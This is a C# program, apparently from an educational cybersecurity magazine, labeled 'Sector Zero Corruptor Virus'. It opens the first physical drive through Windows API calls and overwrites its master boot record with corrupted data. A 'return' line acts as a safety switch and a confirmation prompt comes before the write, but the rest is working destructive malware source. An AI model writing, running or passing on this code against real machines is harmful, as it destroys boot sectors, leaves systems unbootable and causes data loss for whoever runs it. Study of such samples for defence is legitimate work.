
using System.Runtime.InteropServices;

Console.WriteLine(@"
 // (c) ethical.blue Magazine // Cybersecurity clarified.

 ---=== Sector Zero Corruptor Virus ===---

 This program will destroy sector zero
 (master boot record) of \\.\PhysicalDrive0."
+ Environment.NewLine);

return; //SAFETY SWITCH

string? key;
const int FALSE = 0;

Console.WriteLine(@" Are you sure that you want to destroy");
Console.WriteLine(" \\\\.\\PhysicalDrive0 sector zero?");
Console.WriteLine(" [y] Yes or [n] No");
key = Console.ReadLine() ?? "n";
if (key.ToLower().StartsWith("n"))
{
    Console.WriteLine($" Log: \\\\.\\PhysicalDrive0 sector zero destruction CANCELLED.");
    Console.ReadKey();
    return;
}

Console.WriteLine($" Log: Opening drive \\\\.\\PhysicalDrive0...");

IntPtr drive = CreateFileA("\\\\.\\PhysicalDrive0",
FileAccess.Write,
FileShare.Write | FileShare.Read | FileShare.Delete,
IntPtr.Zero,
FileMode.Open,
FileAttributes.System,
IntPtr.Zero);

uint written = 0;

var ret = WriteFile(drive, CorruptedSector.rawData,
                CorruptedSector.rawData.Length, written, IntPtr.Zero);

CloseHandle(drive);

if (ret == FALSE)
    Console.WriteLine(" Log: WriteFile function failed.");
else
    Console.WriteLine(" Log: Sector zero (MBR) successfully overwritten.");

Console.ReadKey();

[DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
static extern unsafe IntPtr CreateFileA(
     [MarshalAs(UnmanagedType.LPStr)] string filename,
     [MarshalAs(UnmanagedType.U4)] FileAccess access,
     [MarshalAs(UnmanagedType.U4)] FileShare share,
     IntPtr securityAttributes,
     [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition,
     [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes,
     IntPtr templateFile);

[DllImport("kernel32.dll", SetLastError = true)]
static extern unsafe int WriteFile(IntPtr handle, byte[] buffer,
  int numBytesToWrite, uint numBytesWritten,
  IntPtr lpOverlapped);

[DllImport("kernel32.dll", SetLastError = true)]
static extern bool CloseHandle(IntPtr hHandle);